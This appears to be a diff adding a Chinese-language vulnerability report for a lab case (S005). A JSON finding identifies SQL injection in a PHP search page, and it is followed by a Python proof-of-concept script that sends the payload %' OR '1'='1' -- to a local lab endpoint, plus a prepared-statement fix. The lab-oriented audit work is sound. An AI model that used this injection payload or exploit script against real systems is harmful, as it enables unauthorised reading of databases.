@@ -1,0 +1,91 @@
+```json
+{
+  "sample_id": "S005",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 直接读取外部 GET 参数 $_GET['q']，未见过滤",
+    "flow": "F01:0007 的 q -> F01:0010 被字符串拼接进 LIKE 模式 -> F01:0011 交给 mysqli query 执行",
+    "guard": "无效：F01:0010 直接拼接，未见预处理绑定、转义或白名单；q 可闭合 SQL 字符串并改变布尔条件",
+    "sink": "F01:0011 调用 $db->query($sql) 执行拼接后的 SQL"
+  },
+  "prerequisites": [
+    "本地入口 http://127.0.0.1:4280/lab_cases/S005/index.php 可访问",
+    "PHP + MariaDB（MySQLi），common/db_connect.php 提供已连接变量 $db",
+    "lab_people 表存在且含预置记录 1 Alice、2 Bob、3 Carol",
+    "无需登录，GET 参数 q 可达查询路径"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体连接实现未提供，连接细节未核查",
+    "数据库用户权限与错误显示设置未提供，影响堆叠注入或报错型扩展利用判断，但不影响当前基础注入路径判断"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "保存为 poc_s005.py 后运行 python3 poc_s005.py。脚本固定访问 http://127.0.0.1:4280/lab_cases/S005/index.php，不跟随重定向。普通请求 q=Alice，预期解析记录仅 {ID 1: Alice}；测试请求 q=%' OR '1'='1' -- （末尾空格），预期解析记录至少包含 {ID 1: Alice, ID 2: Bob, ID 3: Carol} 且多于普通请求。成功断言比较解析后的 ID/name 集合，不以 HTTP 200 为准。失败时检查本地服务与路径、common/db_connect.php 的 $db、lab_people 预置数据和 PHP 错误日志。"
+}
+```
+
+```python
+import http.client
+import re
+import html
+import sys
+from urllib.parse import quote
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S005/index.php"
+
+def fetch(q):
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
+    url = PATH + "?q=" + quote(q, safe="")
+    conn.request("GET", url)
+    resp = conn.getresponse()
+    status = resp.status
+    body = resp.read().decode("utf-8", "replace")
+    conn.close()
+    return status, body
+
+def parse_records(body):
+    records = set()
+    pattern = r"<p>ID\s*(\d+)\s*：\s*([^<]*)</p>"
+    for m in re.finditer(pattern, body):
+        records.add((m.group(1), html.unescape(m.group(2)).strip()))
+    return records
+
+normal_q = "Alice"
+test_q = "%' OR '1'='1' -- "
+
+status_normal, body_normal = fetch(normal_q)
+status_test, body_test = fetch(test_q)
+
+print("普通请求 HTTP 状态:", status_normal)
+print("测试请求 HTTP 状态:", status_test)
+
+if status_normal != 200 or status_test != 200:
+    print("无法判断：请求未正常返回 200，请检查本地服务、路径和连接文件。")
+    sys.exit(2)
+
+normal_records = parse_records(body_normal)
+test_records = parse_records(body_test)
+
+print("普通请求解析记录:", sorted(normal_records))
+print("测试请求解析记录:", sorted(test_records))
+
+expected_normal = {("1", "Alice")}
+expected_test_at_least = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+
+if normal_records != expected_normal:
+    print("无法判断：普通请求记录不符合预期，请检查 lab_people 预置数据、数据库连接和页面输出。")
+    sys.exit(2)
+
+if expected_test_at_least.issubset(test_records) and test_records > normal_records:
+    print("成功断言：测试请求返回了普通请求之外的受控业务记录，解析记录集合包含全部预置人员。")
+    sys.exit(0)
+else:
+    print("未确认：测试请求未返回预期的受控记录差异，请检查 SQL 注释兼容性、数据库内容和错误日志。")
+    sys.exit(1)
+```
+
+防护建议（建议，不是已验证事实）：使用 MySQLi 预处理语句并把 LIKE 模式作为绑定参数传入，避免将 `$_GET['q']` 直接拼入 SQL；输出处已使用 `htmlspecialchars`，不是本次 SQL 注入根因。
